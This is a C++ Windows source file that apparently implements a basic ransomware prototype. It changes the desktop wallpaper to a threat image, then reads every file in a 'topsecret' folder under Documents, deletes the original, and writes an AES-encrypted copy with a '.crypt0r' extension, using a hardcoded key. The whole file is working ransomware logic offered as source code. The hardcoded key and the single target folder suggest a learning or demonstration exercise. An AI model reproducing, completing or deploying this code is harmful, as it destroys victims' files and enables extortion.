#include <iostream>
#include <ShlObj_core.h>
#include <fstream>
#include <filesystem>

#include "../CryptoPP/cryptlib.h"
#include "../CryptoPP/rijndael.h"
#include "../CryptoPP/modes.h"
#include "../CryptoPP/osrng.h"
#include "../CryptoPP/hex.h"

struct Key
{
	std::string iv;
	std::string key;
};

int readFileContents(const std::wstring* pathToFile, std::string* output);
std::string encryptAes(Key& key, std::string& plainText);
Key generateKey();
int changeDesktopWallpaper(std::wstring backgroundImagePath);
bool fileExists(std::wstring path);

int main()
{
	// Constants
	const std::wstring SECRET_FOLDER_NAME = L"\\topsecret";
	wchar_t* documentsFolderPath;
	SHGetKnownFolderPath(FOLDERID_Documents, 0x00, nullptr, &documentsFolderPath);
	const std::wstring SECRET_FOLDER_PATH(std::wstring(documentsFolderPath) + SECRET_FOLDER_NAME);
	const std::wstring THREAT_PICTURE_PATH(std::wstring(documentsFolderPath) + L"\\THREAT.png");

	// threat picture wallpaper
	int status = changeDesktopWallpaper(THREAT_PICTURE_PATH);
	if (status < 0) return status;

	// Get files in 'topsecret' directory
	std::list<std::wstring> filesToEncrypt;
	for (const auto& entry : std::filesystem::directory_iterator(SECRET_FOLDER_PATH))
	{
		filesToEncrypt.push_back(entry.path());
	}

	// For each file, read contents, delete file, encrypt contents and make new file
	std::for_each(filesToEncrypt.begin(), filesToEncrypt.end(), [](std::wstring& filePath)
	{
		// Read contents
		std::wcout << L"# Opening file: \"" << filePath << "\"" << std::endl;
		std::string fileContents;
		readFileContents(&filePath, &fileContents);

		// Delete file
		std::wcout << L"# Deleting file: \"" << filePath << "\"" << std::endl;
		std::filesystem::remove(filePath);

		// Encrypt contents
		std::wcout << L"# Encrypting file: \"" << filePath << "\"" << std::endl;
		Key key = generateKey();
		std::string encryptedContents = encryptAes(key, fileContents);

		// Make new file with encrypted contents (file.txt -> file.txt.crypt0r)
		std::wstring newFilePath(filePath + L".crypt0r");
		std::ofstream encryptedFile(newFilePath);
		encryptedFile << encryptedContents;
		encryptedFile.close();
	});
}

int readFileContents(const std::wstring* pathToFile, std::string* output)
{
	std::ifstream file(*pathToFile);
	if (!file.is_open())
		return -1;

	char character;
	std::string contents;

	while (file)
	{
		character = file.get();
		contents += character;
	}

	file.close();
	*output = contents;

	return 0;
}

Key generateKey()
{
	std::string rawKey = "adrivwm29akqi1mx";
	std::string rawIv = "ejw19ds9fj2nxizp";
	CryptoPP::SecByteBlock key((const CryptoPP::byte*)rawKey.data(), rawKey.size());
	CryptoPP::SecByteBlock iv((const CryptoPP::byte*)rawIv.data(), rawIv.size());

	std::string keyString((const char*)key.BytePtr(), key.size());
	std::string ivString((const char*)iv.BytePtr(), iv.size());

	Key keyOut;
	keyOut.iv = ivString;
	keyOut.key = keyString;

	return keyOut;
}

std::string encryptAes(Key& key, std::string& plainText)
{
	CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption encryptor;
	auto keyData = (const byte*)&key.key[0];
	auto ivData = (const byte*)&key.iv[0];
	encryptor.SetKeyWithIV(keyData, key.key.size(), ivData);

	std::string cipher;
	CryptoPP::StringSource(plainText, true,
	                       new CryptoPP::StreamTransformationFilter(
		                       encryptor, new CryptoPP::HexEncoder(new CryptoPP::StringSink(cipher))));

	return cipher;
}

bool fileExists(const std::wstring path)
{
	return std::filesystem::exists(path);
}

int changeDesktopWallpaper(const std::wstring backgroundImagePath)
{
	if (!fileExists(backgroundImagePath))
	{
		std::cerr << "File \"" << backgroundImagePath.c_str() << "\" does not exist." << std::endl;

		return -1;
	}

	SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0x00, (void*)backgroundImagePath.c_str(), SPIF_UPDATEINIFILE);

	return 0;
}
